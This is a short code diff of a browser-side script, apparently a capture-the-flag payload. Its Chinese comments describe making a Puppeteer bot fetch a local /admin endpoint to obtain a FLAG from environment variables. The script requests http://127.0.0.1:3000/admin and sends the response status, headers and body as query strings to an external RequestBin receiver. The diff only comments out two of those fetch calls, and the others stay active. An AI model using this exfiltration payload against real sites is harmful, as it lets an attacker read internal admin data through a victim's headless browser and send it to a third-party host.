@@ -8,7 +8,7 @@
 <script>
     // ########## 替换成你能通的公网接收地址（比如新的RequestBin/自己的接口）##########
     const YOUR_RECEIVE_URL = "http://www.requestbin.cn:80/1fn11tu1"; // 例：https://en8x0z9p37r.x.pipedream.net/
-    fetch(YOUR_RECEIVE_URL+'?id-='+Math.random());
+   // fetch(YOUR_RECEIVE_URL+'?id-='+Math.random());
     // ###########################################################################
     const param = {"url":"http://127.0.0.1:3000/admin"};
     // 核心：访问/admin获取环境变量的FLAG，Puppeteer同域无跨域，直接解析JSON
@@ -26,7 +26,7 @@
             const respStatus = res.status;
              fetch(YOUR_RECEIVE_URL+'?respS-='+respStatus);
             const headersArr = Array.from(res.headers.entries()).map(([key, value]) => `${key}: ${value}`);
-            fetch(YOUR_RECEIVE_URL+'?headersArr-='+headersArr);
+           // fetch(YOUR_RECEIVE_URL+'?headersArr-='+headersArr);
             const respJson = res.json();
             fetch(YOUR_RECEIVE_URL+'?respJson-='+respJson);
             
